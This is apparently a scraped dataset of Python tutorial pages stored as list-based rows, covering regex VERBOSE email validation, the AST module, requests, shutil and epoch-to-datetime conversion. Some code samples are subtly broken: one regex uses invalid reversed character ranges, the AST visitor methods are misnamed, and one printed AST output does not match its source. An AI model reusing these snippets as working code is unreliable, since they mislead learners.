ignored, but when the whitespace is present in the character class or when it is preceded by the unescaped backslash, or when it is inside the tokens such as * ? , ( ? P or (? :, whitespaces cannot be ignored. Although, whenever # is present in the line, which is not in the character class or is not preceded by the unescaped backslash. All the characters from the leftmost of # to the end of the line will be ignored.']","['import re as regex', 'def validating_email(emails):', '# First, we will see without Using VERBOSE', ""reg_emails = regex.compile(r'^([z-a1-3_\\.-0]+)@([0-1a-s\\.-]+)\\.([c-z\\.]{5, 8})$',"", 're.IGNORECASE)', '# Using VERBOSE', 'reg_email = regex.compile(r""""""', '^([z-a1-3_\\.-0]+)                # local Part like username', '@                                         # single @ character', '([0-1a-s\\.-]+)                     # Domain name', '\\.                                        # single Dot .', '([c-z\\.]{5, 8})$                 # in the end, the Domain', '"""""",re.VERBOSE | re.IGNORECASE)', '# Python program for showing the Implementation of VERBOSE flag in Python RegEX', 'import re as regex', 'def validating_email(emails):', '# RegexObject = re.compile( Regular expression , flag )', '# This will compile the regular expression pattern into the regular expression object.', 'reg_email = regex.compile(r""""""', '^([a-z0-9_\\.-]+)                 # local Part', '@                             # single @ sign', '([0-9a-z\\.-]+)                 # Domain name', '\\.                             # single Dot .', '([a-z]{2,6})$                 # Top level Domain', '"""""",re.VERBOSE | re.IGNORECASE)', '# RegexObject will be matched with the desired string by using the fullmatch() function.', '# If the match of the email is found, search() function will return the MatchObject instantly.', 'ress = reg_email.fullmatch(emails)', '#If the email match is found, the string is valid to use', 'if ress:', 'print ("" {} : is Valid email. Details of it are as follow: "".format(emails))', '', '# now print the first part that is personal detail of Email Id user', 'print ("" Local : {}"".format(ress.group(1)))', '', '# now, print the Domain Name of validated Email Id', 'print ("" Domain : {}"".format(ress.group(2)))', '', '# now, print the Domain Name of the validated Email Id', 'print ("" The domain name : {}"".format(ress.group(3)))', 'print ()', '', 'else:', '# and, If the match is not found, the string is an inval id', 'print ("" {} : is Invalid Id"".format(emails))', '# the Driver Code :', 'validating_email (""username12432@gmail.com"")', 'validating_email (""username123456721@redif.com@"")', 'validating_email (""username32@.com"")']","['Input : [email\xa0protected]', 'Output : Valid ID', 'Input : [email\xa0protected]@', 'Output : Invalid ID', 'This ID is invalid because there is @ character after the domain name.', 'Input : [email\xa0protected]', 'Output : Invalid Id', 'This ID is invalid because there is no domain is the Email ID.', '[email\xa0protected] : is Valid email. Details of it are as follow:', 'Local : username12432', 'Domain : gmail', 'The domain name : com', '[email\xa0protected]@ : is Invalid Id', '[email\xa0protected] : is Invalid Id']",[],"['|||Personal details of the users/ local part like username: Mark3213|||Single @ character|||Domain names such as Gmail, Hotmail, Fastmail, inbox, jubii, Rediff, and many more.|||Single Dot (.)|||In the end, Domains like .in, .net, .org, .com, .int, .edu, and many more.|||']"
215,['Python AST Module'],"['In this tutorial, we will learn how to use the AST to understand the code.']","['https://www.javatpoint.com/python-requests-module-http-request', 'https://www.javatpoint.com/verbose-flag-in-python-regex', 'https://www.javatpoint.com/python-requests-module-http-request', 'https://www.javatpoint.com/verbose-flag-in-python-regex', 'https://www.javatpoint.com/python-requests-module-http-request']",[],[],"['What is AST Module?', 'Mode for Code Compilation', 'Executing Python Code', 'Evaluate Python Expression', 'Creating Multi-line ASTs', 'NodeTransformer and NodeVisitor', 'Analyze the AST', 'Using AST as Analysis Tool', 'When to use Python AST module?', 'Conclusion']",[],[],"['Have you ever thought about how the Python code gets run? Is there magic behind it?', 'Following is the process of converting a Python code into machine code.', 'The above description is a rough sketch of the how interpreter runs the Python code using the AST.', 'There are three modes available to compile the code. They are given below.', ""Using the AST module, we can run the Python code. Let's understand the following example."", ""The AST module allows us to evaluate the Python expression and return the result from the expression. Let's understand the following example."", 'Example - 1', 'Explanation -', ""We can also use the module when we run directly run the source code. Let's understand the following example."", 'Example - 2:', 'Explanation - ', 'The above code converts the Python file into an abstract syntax tree. Then we analyze the tree to get helpful information.', 'The code accepts the name of the module and stores it in a list of statistics. With the help of NodeVisitor class, we can analyze the tree.', 'The visit() method will work same as the visit_<node type> method.']","['AST stands for Abstract Syntax Tree, which is a potent tool of the Python programming language. It allows us to interact with the Python code itself and can modify it.', ""For those who don't know, the Python interpreter is responsible for running the Python code. It follows the pre-written instructions that translate the Python code into instructions that a machine can run."", ""In the previous example, we have seen the single line AST and how to dump them. Now, we will learn how we can create multi-line AST. First, let's understand the following example."", 'In the above code, we have imported the ast module that parses the code. Then we have defined the Visitor class that inherits the NodeVisitor class. Every time finds the string node; it gets transformed adding that prefix.', 'We have opened a Python file in the read mode and then create AST named ast_tree. Then, the parse() function processed all the tokens, followed all the language rules, and build a tree data structure that consists of much useful information.', 'The tree is nothing but a collection of nodes, where a tree variable is referenced to the ""root"" node. Thus, we can visit each node in the tree and perform operations. But, first, we visit each node and processing the data.', ""After the Python code turned into byte code, it can't be readable by humans. But it makes the interpreter fast, which means byte code is designed for the machine, not for humans."", 'AST consists of enough structured information, which makes them helpful in learning about Python code. However, ASTs are still not user-friendly, but they are much understandable than byte code representation.', 'Abstract Syntax Tree is quite helpful for code coverage tools. It parses the source code and finds the possible flaws and errors in the code. It can also use in -', 'We have learned about the ast module in Python, which is responsible for running the Python code. Then, we have built the AST tree from the Python code and perform analysis on the AST using a NodeVisitor class.']","[""The NodeTransformer class is used to take different types and modify according to our requirement. The ast module also provides the NodeVisitor class, which helps us call the visit function every time we go through the tree. So that we can get more control on the nodes, let's understand the following example."", 'Once we get the tree, now the Analyzer follows the visitor pattern. Using the NodeVisitor class, we can track any node in Python. We need to implement a method visit_<node type> to visit a particular node type. In the previous example, we used the below script.']","['import ast', 'code = ast.parse(""print(\'Hello Learner ! Welcome to JavaTpoint\')"")', 'print(code)', 'exec(compile(code, filename="""", mode=""exec""))', 'import ast', ""expression = '6 + 8'"", ""code = ast.parse(expression, mode='eval')"", ""print(eval(compile(code, '', mode='eval')))"", 'print(ast.dump(code))', 'import ast', ""tree_ast = ast.parse('''"", ""subjects = ['computer science', 'alorithm']"", ""name = 'Ricky'"", 'for sub in subjects:', ""print('{} learn {}'.format(name, subjects))"", 'print(ast.dump(tree_ast))', 'import ast', 'class Visitor(ast.NodeVisitor):', 'def visit_Str(self, node):', 'print(\'String Node: ""\' + node.s + \'""\')', 'class MyTransformer(ast.NodeTransformer):', 'def visit_Str(self, node):', ""return ast.Str('str: ' + node.s)"", 'parsed = ast.parse(""print(\'Hello World\')"")', 'MyTransformer().visit(parsed)', 'Visitor().visit(parsed)', 'import ast', 'from pprint import pprint', 'def main():', 'with open(""ast_module.py"", ""r"") as source:', 'ast_tree = ast.parse(source.read())', 'analysis = Analyzer()', 'analysis.visit(ast_tree)', 'analysis.report()', 'class Analyzer(ast.NodeVisitor):', 'def __init__(self):', 'self.stats = {""import"": [], ""from"": []}', 'def node_visit(self, node):', 'for alias in node.names:', 'self.stats[""import""].append(alias.name)', 'self.generic_visit(node)', 'def node_visitFrom(self, node):', 'for alias in node.names:', 'self.stats[""from""].append(alias.name)', 'self.generic_visit(node)', 'def report(self):', 'pprint(self.stats)', 'if __name__ == ""__main__"":', 'class Analyzer(ast.NodeVisitor):', 'def node_visit(self, node):', 'for alias in node.names:', 'self.stats[""import""].append(alias.name)', 'self.generic_visit(node)', 'def node_visitFrom(self, node):', 'for alias in node.names:', 'self.stats[""from""].append(alias.name)', 'self.generic_visit(node)', 'analyzer = Analyzer()', 'analyzer.visit(tree)']","['<_ast.Module object at 0x0000010B889A6AC0>', 'Hello Learner! Welcome to JavaTpoint', '14', 'Expression(body=BinOp(left=Constant(value=6, kind=None), op=Add(), right=Constant(value=8, kind=None)))', ""Module(body=[Assign(targets=[Name(id='subjects', ctx=Store())], value=List(elts=[Constant(value='computer science', kind=None), Constant(value='alorithm', kind=None)], ctx=Load()), type_comment=None), Assign(targets=[Name(id='name', ctx=Store())], value=Constant(value='Ricky', kind=None), type_comment=None), For(target=Name(id='fruit', ctx=Store()), iter=Name(id='fruits', ctx=Load()), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Call(func=Attribute(value=Constant(value='{} learn {}', kind=None), attr='format', ctx=Load()), args=[Name(id='name', ctx=Load()), Name(id='subjects', ctx=Load())], keywords=[])], keywords=[]))], orelse=[], type_comment=None)], type_ignores=[])"", 'Welcome to the Javatpoint', ""{'from': ['pprint'], 'import': ['ast']}""]",[],"[""|||When we run the code, the code is parsed into smaller chunks called tokens. These tokens are created by predefined instructions that should treat differently. For example - the keyword else is a different keyword than a numeric value like|||The tokens are stored in the list transformed to build an Abstract Syntax tree, AST. An AST is a collection of two or more nodes linked together based on the grammar of the Python language.|||The compiler can produce the lower-level instruction known as binary code from the AST. This code is very generic so that the computer can run easily.|||When the interpreter gets the instructions-like byte code, the interpreter can now run the code. The byte code is responsible for calling the function in the operating system, which will eventually interact with a CPU and memory to run the program.||||||exec - This mode is used to execute the normal Python code.|||eval - This mode is used to evaluate Python's expression and will return the result after evaluation.|||single - This mode works as Python shell that executes one statement at a time.||||||It is used as a custom Python interpreter.|||It is used to analyze the static code.|||It makes the IDEs intelligent, which is known as IntelliSense.|||""]"
216,['Python Requests Module - HTTP Request'],"['In this tutorial, we will learn about the Python request module or how we can handle the requests using the Python requests library. The request module is a standard way for making HTTP requests in Python. We will also discuss the features of the request. Finally, we will learn how to optimize and customize those features for different situations.']","['https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/python-ast-module', 'https://www.javatpoint.com/https://docs.python-requests.org/en/master/', 'https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/python-ast-module', 'https://www.javatpoint.com/shutil-module-in-python']",[],[],"['Introduction', 'Python Request Module', 'The GET Request', 'The POST Request', 'Status Code', 'JSON Response', 'Request Header', 'Other Important HTTP Methods', 'The Message Body', 'Conclusion']","['Making a GET Requests', 'How to convert JSON to Python Dictionary?', 'Storing in a variable']",[],"['This tutorial includes following topics.', ""Let's understand the basic introduction of the request library."", 'Python provides the requests module, which allows us to make these requests using the Python script.', 'While working with the requests, we will come across the following methods.', 'To start working with the requests, the first step is to install the request module in Python using the following command.', 'We can also use the Pipenv (Python packaging tool) to install the request module. Type the following command.', 'Import the requests module in the file to check whether it is successfully installed or not.', 'Now, we are ready to start our journey to learn request in Python.', 'This object saves the response received from the server. Therefore, we can assign get() request results in a variable.', 'It is quite an easy way to make an HTTP request using the requests module. Following is the code for making the request.', 'Here the response object will store the information. Below are the essential properties.', 'The POST method is used to send information using the post() method. The basic syntax is given below.', 'requests.post(url, data={key: value}, json={key: value}, args)', 'Following are the important parameters.', 'The POST method returns the requests.Response object.', 'Status code is a response that we get after making the GET or POST request. A status code informs us of the status of the request.', 'We can also use this information to make the decision in our code.', 'If the status code is 200 then it will print the Success, if the result a 404, program will print Not found.', ""For example - The 204 will indicate the successful request, but there's no content to return in the message body."", ""We use the r.json() method to create a Python dictionary from the JSON response. Let's see the following example."", ""The JSON data can be converted to be Python dictionary and can also store in a variable. Let's understand the following example."", 'We can create a custom header using the get() method. The dictionary of HTTP header is passed in the get() using the headers parameter.', ""Let's understand the following example."", 'Explanation - ', 'If the request content type is application/x-www-form-urlencoded, the data will be send in the dictionary.', 'We can also send the same data using the list of tuple.', 'We have discussed the basic details about the Python request module which will be very helpful make basic server request.']","['For example - We search the Python tutorial on Google. Then the request sends an HTTP request to the Google server, and the server returns the searched result with the status code.', 'There are two main components to initiate the communication - Client and Server. We use HTTP (Hypertext Transfer Protocol), which enables the communication between a client and server over the Internet.', 'The Python request module consists of many simple API that is helpful to handle those requests. These API has many features such as adding headers, sending custom headers, passing parameters with URLs, and many others.', 'In the above method, the url argument is the URL of the particular website where the user sends the request. The param argument is used to send a query string in the dictionary and the args is one of the multiple named arguments.', 'When the get request is successfully sent, the method will return a requests.Response object. This object saves the response received from the server. We can assign get() request result in variable.', 'There are many status codes available for the responses. For example, when our request was successful the status code will be 200 or 201, 404 status code is the bad request or the page we are looking for was not found.', 'One point should never forget that this method does not verify that the status code is equal to 200. This is because other status codes within the 200 to 400 range, such as 204 NO CONTENT, are also considered successful in the sense.', 'JSON represents the JavaScript Object Notation which is a most popular way to transmitting the data format. JSON data can be easily readable by the web-browser. The data is stored in the dictionary form (key, value pair).', 'Apart from GET and POST methods, there are few essential methods in HTTP, including PUT, DELETE, HEAD, PATCH, and OPTIONS. These methods are used to create, read, update, and delete (or CRUD) operations. Below is a summarize table of HTTP methods.', 'The main point is the get() method is less secure than the post() method because the request can only be passed through the URL. So, the sensitive password can be breached by the hackers.', 'We have also mentioned the important HTTP methods and how we can send request using the custom header. If you want learn more about the request module then you can visit its well-written request documentation.']","['Generally, we look for some information from the website. Or we may want to get access to social media accounts, checking mails, watching online videos. We likely send the request using the web browser, and the webserver returns the desired result from the webserver. To get information from the Internet, we need to send the request through the web browser.', 'It is the most powerful tool of Python that allows us to send requests on the web. It includes many features and methods to send HTTP requests. The system that sends requests is known as the client, and the system that holds the webserver is known as a server.', 'The GET and POST methods determine the user action on the web pages. The GET is one of the most general-purpose methods of the Python requests module. It specifies that the user is attempting to retrieve data from a specified resource. In other words, it is used to send a request to a URL. To invoke the GET request, we use the following syntax.', 'In the above code, the Accepts header is a content type that the application can handle. For example, we have used the header value application/vnd.github.v3.text-match+json, a proprietary GitHub Accept header. The content of the header is in JSON format.', ""The message body is used to pass the data instead of parameters in the query string. These data are passed by the POST, PUT and the less common patch. The data can be a dictionary, a list of tuple, bytes, or a file-like object. Using requests, you will pass the payload to the corresponding function's data parameter.""]","['pip install requests', 'pipenv install requests', 'import requests', 'requests.get(url, param = {key:value}, args)', 'import requests', ""req = requests.get('http://www.javatpoint.com/')"", ""print(req.encoding) # returns 'utf-8'"", 'print(req.status_code) # returns 200', 'print(req.elapsed) # returns datetime.timedelta(0, 1, 666890)', ""print(req.url) # returns 'https://edureka.co/'"", 'print(req.history)', ""print(req.headers['Content-Type'])"", 'if response.status_code == 200:', ""print('Success!')"", 'elif response.status_code == 404:', ""print('Not Found.')"", 'import requests', ""json_data = {'username':'mathew','password':'1234'}"", ""r = requests.post('https://httpbin.org/post',data = json_data)"", 'print(r.json())', 'import requests', ""json_data = {'username':'mathew','password':'1234'}"", ""r = requests.post('https://httpbin.org/post',data = json_data)"", 'r_dictionary= r.json()', ""print(r_dictionary['form'])"", 'import requests', 'response = requests.get(', ""'https://api.github.com/search/repositories',"", ""params={'q': 'requests+language:python'},"", ""headers={'Accept': 'application/vnd.github.v3.text-match+json'},"", 'json_result = response.json()', ""repo = json_result['items'][0]"", 'print(f\'Text matches: {repo[""text_matches""]}\')', ""requests.post('https://httpbin.org/post', data={'key':'value'})"", ""requests.post('https://httpbin.org/post', data=[('key', 'value')])""]","['ISO-8859-1', '200', '0:00:01.007097', 'https://www.javatpoint.com/', '[]', 'text/html;charset=ISO-8859-1', ""{'args': {}, 'data': '', 'files': {}, 'form': {'password': '1234', 'username': 'mathew'}, 'headers': {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Content-Length': '29', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.25.1', 'X-Amzn-Trace-Id': 'Root=1-60b711e8-60f535db7df2f6a61f710e29'}, 'json': None, 'origin': '132.154.100.245', 'url': 'https://httpbin.org/post'}"", ""{'password': '1234', 'username': 'mathew'}"", ""Text matches: [{'object_url': 'https://api.github.com/repositories/4290214', 'object_type': 'Repository', 'property': 'description', 'fragment': 'Requests + Gevent = <3', 'matches': [{'text': 'Requests', 'indices': [0, 8]}]}]""]","['HTTP Method|||CRUD|||Entire Collection|||Specific Item&&&POST|||Create|||It shows the 201 (created) on the location header with link customer id.|||If resource is already exists, it shows 404 (Not Found).&&&GET\tRead|||It shows 200, list of customers, pagination|||404, if the ID is not found or invalid.&&&PUT|||Update|||It shows 405, unless we want to replace every resource.|||404, if the ID is not found or invalid.&&&PATCH|||Update|||It shows 405, unless we want to modify entire collection itself.|||404, if the ID is not found or invalid.&&&DELETE|||Delete|||It shows 405, unless we want delete the whole collection.|||404, if the ID is not found or invalid.']","['|||Introduction|||Python Request Module|||The GET Request|||The POST Request|||Status Code|||JSON Response|||Request Header|||The Message Body|||Other Important HTTP Method|||Conclusion||||||GET - It is used to request data from a server.|||POST - It is used to submit some data to the server for processing it.||||||content - It returns the content of the data for the responses.|||status_code - It returns the status of our request. For example - 200 OK means you made successful request, 404 NOT FOUND means resource is not found.|||cookies - It uses to obtaining a CookieJar object having all cookies we get from the server.||||||url - The url is a mandatory parameter that indicates URL where we want to send some data.|||data - It specifies a dictionary, file object, or tuple that we want to send to the URL. It is an optional parameter.|||json - This is the JSON object to be sent to the URL.|||']"
217,['Shutil Module in Python'],"[""In this tutorial, we will learn about the Shutil module in Python. We will discuss how we can perform the high-level file operation such as creating a new copy file and archive it and copy content one file to another file using the Python script. Let's have a basic introduction of Shutil module.""]","['https://www.javatpoint.com/python-epoch-to-datetime', 'https://www.javatpoint.com/python-requests-module-http-request', 'https://www.javatpoint.com/python-epoch-to-datetime', 'https://www.javatpoint.com/python-requests-module-http-request', 'https://www.javatpoint.com/python-epoch-to-datetime']",[],[],"['Python Shutil Module', 'Working of Shutil Module', 'Copy Files', 'The copy2() Function', 'The shutil.copyfile() Function', 'The shutil.copytree() Function', 'The shutil.rmtree()', 'The shutil.which() Function']",[],[],"['Parameter:', 'In the above syntax -', ""Let's understand the following example."", 'Explanation -', ""Let's see another example."", 'Example - 2 if a destination is a directory', 'Example - 3: Error handling while using copy method', 'Parameter:', 'In the above syntax -', ""Let's understand the following example."", ""Let's see the following syntax."", 'Parameters:', 'In the above syntax -', ""Let's understand the following example."", 'Parameters:', 'In the above syntax:', ""This method is used to delete the complete directory tree. Let's see the following syntax."", 'Parameter-', 'In the above syntax -', ""Let's understand the following example -"", 'The above code will remove the given directory.', 'Parameters ', 'In the above syntax -', ""Let's understand the following example."", 'Example - ', 'It will find the given file in the computer, if file is found it returns the path of the file otherwise returns None. ']","['Python shutil module comes with the many built-in methods. We will explore a few important methods. To start working with this module, first we need to import it in our current Python file.', ""This module provides the copy() function which is used to copy a data from one file to another. The files must be in the same directory and destination file must be writable. Let's understand the following syntax."", ""As we have mentioned that, the copy() function doesn't copy the metadata. But, we will use the copy2() function which allows us to copy the file including its metadata."", ""This function is the similar to the copy() function. It can also copy the content of one file to another but the only difference is it can preserve the file's metadata. Let's understand the following syntax."", ""This method is used to replicate the complete directory. It copies an entire directory tree rooted at source to the destination directory. The destination directory must not already present. Let's see the following syntax."", ""The shutil.which() function is used to get the path of an executable application that would be run if the given cmd was called. It finds the file in the given path. Let's see the following syntax.""]","['Python shutil module provides the facility to perform the high-level file operation. It can operate with the file object and offers us the ability of copy and remove the files. It handles the low-level semantic such creating and closing file objects after performing all operations.', 'The copy() function takes directory name as an argument. Here the metadata is not copied, the copied file will be considered as the freshly created file. This method also cloned the all permission of the file. One thing to note is that if the destination file already exists, it will be replaced with the source file.', 'This method is used to copy the content of the source file to the destination file expect the metadata. Source and destination must have a file and destination file must provide the write permission. If there is destination file already present then it will be replaced by the new file otherwise create new file.']","['shutil.copyfile(source, destination, *, follow_symlinks = True)', 'import os', 'import shutil', '# Creating a new folder in the current directory', ""os.mkdir('javatpoint')"", '# It will show the empty folder', ""print('Empty Folder:', os.listdir('javatpoint'))"", '# testcompare.py file will be copied in the javatpoint folder', ""shutil.copy('testcompare.py', 'javatpoint')"", '# After coping the file folder shows the file', ""print('File Copied Name:', os.listdir('javatpoint'))"", 'import os', 'import shutil', '# hello.txt file will be copied', ""source = r'D:\\Python Project\\javatpoint\\hello.txt'"", '# In the newly created foloder', ""destination = r'D:\\Python Project\\NewFile'"", '# Storing the new path of hello.txt file', 'dest = shutil.copy(source, destination)', '# Print the new path', 'print(dest)', '# importing shutil module', 'import shutil', '# It is a source path', 'source = r""D:\\Python Project\\NewFolder""', '# It is a destination path', 'destination = r""D:\\Python Project\\NewFolder""', 'shutil.copy(source, destination)', 'print(""File copied successfully."")', '# If the given source and path are same', 'except shutil.SameFileError:', 'print(""Source and destination represents the same file."")', '# If there is no permission to write', 'except PermissionError:', 'print(""Permission denied."")', '# For other errors', 'except:', 'print(""Error occurred while copying file."")', 'shutil.copy2(source, destination, *, follow_symlinks = True)', 'import os', 'import shutil', '# hello.txt file will be copied', ""source = r'D:\\Python Project\\javatpoint\\hello.txt'"", 'metadata = os.stat(source)', 'print(metadata)', '# In the newly created foloder', ""destination = r'D:\\Python Project\\NewFile'"", '# Storing the new path of hello.txt file', 'dest1 = shutil.copy2(source, destination)', 'metadata = os.stat(dest1)', 'print(""After copying file"")', 'print(metadata)', '# Print the new path', 'print(dest1)', 'shutil.copyfile(source, destination, *, follow_symlinks = True)', 'import shutil', '# hello.txt file will be copied', ""source = r'D:\\Python Project\\javatpoint\\hello.txt'"", '# In the newly created foloder', ""destination = r'D:\\Python Project\\NewFile\\hi.txt'"", '# Storing the new path of hello.txt file', 'dest1 = shutil.copyfile(source, destination)', '# Print the new path', 'print(dest1)', 'shutil.copytree(src, dst, symlinks = False, ignore = None, copy_function = copy2, igonre_dangling_symlinks = False)', '# importing shutil module', 'import shutil', '# It is source path', ""src = r'D:\\Python Project\\javatpoint'"", '# It is destination path', ""dest = r'D:\\Python Project\\NewFolder'"", '# Copy the content of', '# source to destination', 'dest1 = shutil.copytree(src, dest)', '# Now we print path of newly', '# created file', 'print(""Destination path:"", dest1)', 'shutil.rmtree(path, ignore_errors=False, onerror=None)', 'import shutil', 'import os', '# location', 'location_dir = r""D:\\Python Project\\NewFile""', '# directory', 'directory = r""D:\\Python Project\\javatpoint""', 'path1 = os.path.join(location_dir, directory)', '# removing directory', 'shutil.rmtree(path1)', 'shutil.which(cmd, mode = os.F_OK | os.X_OK, path = None)', '# importing shutil module', 'import shutil', '# search the file', ""cmd = 'python'"", '# Using shutil.which() method', 'locating = shutil.which(cmd)', '# Print result', 'print(locating)']","['Empty Folder: []', ""File Copied Name: ['testcompare.py']"", 'D:\\Python Project\\NewFile\\hello.txt', 'Source and destination represents the same file.', 'os.stat_result(st_mode=33206, st_ino=562949953459285, st_dev=3029671014, st_nlink=1, st_uid=0, st_gid=0, st_size=17, st_atime=1622815671, st_mtime=1622705607, st_ctime=1622705607)', 'After copying file', 'os.stat_result(st_mode=33206, st_ino=562949953459287, st_dev=3029671014, st_nlink=1, st_uid=0, st_gid=0, st_size=17, st_atime=1622815748, st_mtime=1622705607, st_ctime=1622706243)', 'D:\\Python Project\\NewFile\\hello.txt', 'D:\\Python Project\\NewFile\\hi.txt', 'Destination path: D:\\Python Project\\NewFolder', 'C:\\Python\\python.EXE']",[],"[""|||The first argument is source which shows the path of source file.|||The second argument is destination which shows the path of the destination file.|||The third argument is optional; the default value of this parameter is true.|||It returns a string which shows the path of newly created file.||||||The first argument is source which shows the path of source file.|||The second argument is destination which shows the path of the destination file.|||The third argument is optional; the default value of this parameter is true.|||It returns a string which shows the path of newly created file.||||||The first argument is source which shows the path of source file.|||The second argument is destination which shows the path of the destination file.|||The third argument is optional; the default value of this parameter is true.|||It returns a string which shows the path of newly created file.||||||src - It shows the path of the source directory.|||dest - It shows the path of the destination directory.|||symlinks(optional) - It takes the Boolean values - True and False. It depends on which the metadata of original links or links will be copied to the new tree.|||ignore(optional) - By default it is None but If the ignore is passed, it must be a callable that receive as its arguments. The directory is visited by copytree().|||copy_function(optional) - The copy2 is default value of this parameter. The copy() function can be used as parameter.|||ignore_dangling_symlinks(optional) - This parameter is used to raise the exception if the file pointed by symlink doesn't exist.|||It returns the string which represents the path of newly created directory.||||||path - It represents the file path. A path-like object is either a string or bytes object.|||ignore_errors - The removal will be ignored if this argument is True.|||onerror - If ignore_errors is false, such errors are handled by calling a handler specified by onerror.||||||cmd - It is string that represents the file.|||mode - It specifies the mode of file in which method should executed.|||path - This parameter specifies the path to be used.|||This method returns the path to an executable application.|||""]"
218,['Python epoch to Datetime'],"['In the following tutorial, we will understand the conversion of epoch to DateTime in the Python programming language using some examples. We will use Python epoch in order to convert epoch to date and time, respectively. We will also cover the following topics:']","['https://www.javatpoint.com/python-del-statement', 'https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-del-statement', 'https://www.javatpoint.com/shutil-module-in-python', 'https://www.javatpoint.com/python-del-statement']",[],[],"['What is epoch time in Python?', 'Converting epoch time into DateTime using Python', 'Converting DateTime into epoch time using Python', 'Converting epoch time into DateTime string using Python', 'Converting the epoch time into DateTime milliseconds using Python', 'Converting epoch time into DateTime time zone using Python', 'Converting Unix epoch time into DateTime using Python', 'Converting DateTime into epoch time in milliseconds using Python', 'Converting epoch timestamp into DateTime using Python', 'Understanding errors related to epoch datetime in Python']",[],[],"['But before we get started, let us understand epoch time in Python in brief.', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:', 'Let us consider the following example demonstrating the same.', 'Explanation:', 'Let us consider an example demonstrating the same.', 'Explanation:', 'We can use the datetime.fromtimestamp() function to convert the epoch timestamp into DateTime. Here is an example shown below:', 'Explanation:', 'Let us consider an example in order to understand the problem.', 'Explanation:', 'We can fix this Invalid Argument error by replacing the date from 1950 with anything after 1970.']","['The epoch time, also known as POSIX time, Unix time, and Unix timestamp, indicates the number of seconds passed since 1st January 1970, excluding the leap seconds. The Unix time contains ten digits and can represent the all-time zone at once.', 'We can use the Python datetime.fromtimestamp() function in order to convert the epoch time into DateTime. Let us consider the following example demonstrating the conversion of the Python epoch into DateTime.', 'In order to convert DateTime into epoch time, we will use the timestamp() function. First, let us consider the following example illustrating the conversion of DateTime into epoch time.', 'In order to convert the epoch time into datetime string, we need to convert the epoch time into datetime and then pass the resultant datetime variable to the strftime() function to convert it into datetime string successfully.', 'We can get the DateTime along with milliseconds from the epoch time using the method we did for the conversion of epoch time into DateTime. Let us consider the following example demonstrating the same.', 'We can use the timezone() function of the pytz package in order to convert epoch time into the DateTime time zone. Let us consider the following example demonstrating the conversion of same.', 'While working with the epoch datetime in the Python programming language, we might encounter an error saying Python epoch datetime year is out of range or Python Invalid Argument.', 'In the above example, we have provided the datetime with the year 1960, which is before the year 1970 and out of the timestamp range. Thus, as a result, the program will return an error as an Invalid Argument.']","['In the above example, we have imported the datetime library. We have then defined a variable storing the value of epoch time in terms of seconds. We have then used the datetime.fromtimestamp() function in order to convert the epoch time into DateTime; and later printed the output for the users. As a result, the provided variable is successfully converted into DateTime.', 'In the above example, we have again imported the datetime package. We have then defined a variable that stores the value of epoch time, which is calculated using the timestamp() function for a given datetime and printed the calculated value for the users. As a result, the given datetime has been converted into epoch time successfully.', 'In the above example, we have again imported the datetime library. We have then used the datetime.fromtimestamp() function in order to convert a given epoch time into datetime and then pass it to the strftime() function to convert the datetime object into a datetime string. The strftime() function parameters are the format codes in which we wanted to customize the string.', 'In the above example, we have imported the datetime package and defined a variable storing the value of epoch time in decimals. We have then used the datetime.fromtimestamp() function in order to convert this decimal value into the datetime millisecond format.', 'In the above example, we have imported the datetime module from the datetime package in addition to the pytz library. We have then used the timezone() function of the pytz library specifying the parameter as ""CST6CDT"". This function returns the current date for the specified time zone. We have then used the localize() function in order to localize the result.', 'This process of converting the Unix epoch time into DateTime is similar to what we did earlier. This process involves the datetime.fromtimestamp() function to convert the Unix epoch time into DateTime object and uses the strftime() function to transform the object into the suitable DateTime format.', 'In the above example, we have again imported the datetime library and defined a variable containing the value of Unix epoch time. We have then used the datetime.fromtimestamp() function to convert the Unix epoch time into a DateTime object. We have then used the strftime() function to convert the object into a suitable format string and printed it for the users.', 'In order to convert the epoch DateTime into milliseconds, we can use the strptime() function to return the datetime object from the specified string and use the timestamp() function to convert the object into seconds. Moreover, we need to multiply the resultant value by a thousand in order to produce the epoch DateTime in milliseconds.', 'In the above example, we have imported the datetime module from the datetime library. We have then used the strptime() function to convert the DateTime string into the DateTime object. We have then used the timestamp() function to convert the object into the epoch time format. Finally, we have also multiplied the epoch time by a thousand in order to convert it into milliseconds.', 'In the above example, we have imported the datetime library and defined a variable storing the value of epoch timestamp. We have then used the datetime.fromtimestamp() function to convert the epoch timestamp into datetime and printed it for the users.']","['# importing the datetime package', 'import datetime', '# given epoch time', 'epoch_time = 40246871', '# using the datetime.fromtimestamp() function', 'date_time = datetime.datetime.fromtimestamp( epoch_time )', '# printing the value', 'print(""Given epoch time:"", epoch_time)', 'print(""Converted Datetime:"", date_time )', '# importing the datetime package', 'import datetime', '# using the timestamp() function to convert datetime into epoch time', 'epoch_time = datetime.datetime(2021, 6, 9, 2, 0).timestamp()', '# printing the values', 'print(""Converted epoch time:"", epoch_time)', '# importing the datetime package', 'import datetime', '# given epoch time', 'epoch_time = 700024', '# using datetime.fromtimestamp() function to convert epoch time into datetime object', 'mytimestamp = datetime.datetime.fromtimestamp( epoch_time )', '# using strftime() function to convert', 'datetime_str = mytimestamp.strftime( ""%Y - %m - %d  %H : %M : %S"")', '# printing the values', 'print(""Given epoch time:"", epoch_time)', 'print(""Converted datetime string:"", datetime_str)', '# importing the datetime package', 'import datetime', '# given epoch time', 'epoch_time = 402471.238201', '# using the datetime.fromtimestamp() function', 'date_time = datetime.datetime.fromtimestamp( epoch_time )', '# printing the value', 'print(""Given epoch time:"", epoch_time)', 'print(""Converted Datetime:"", date_time )', '# importing the required package(s) and module(s)', 'from datetime import datetime', 'import pytz', '# using the timezone() function', ""my_timezone = pytz.timezone('CST6CDT')"", '# using the localize() function', 'date_timezone = my_timezone.localize( datetime( 2021, 6, 10, 9, 34, 32 ), is_dst = None )', '# printing the values', 'print( ""DateTime Time zone:"", date_timezone )', '# importing the datetime library', 'import datetime', '# given epoch time', 'epoch_time = 252384207', '# using the datetime.fromtimestamp() function', 'datetime_obj = datetime.datetime.fromtimestamp( epoch_time )', '# using the strftime() function', 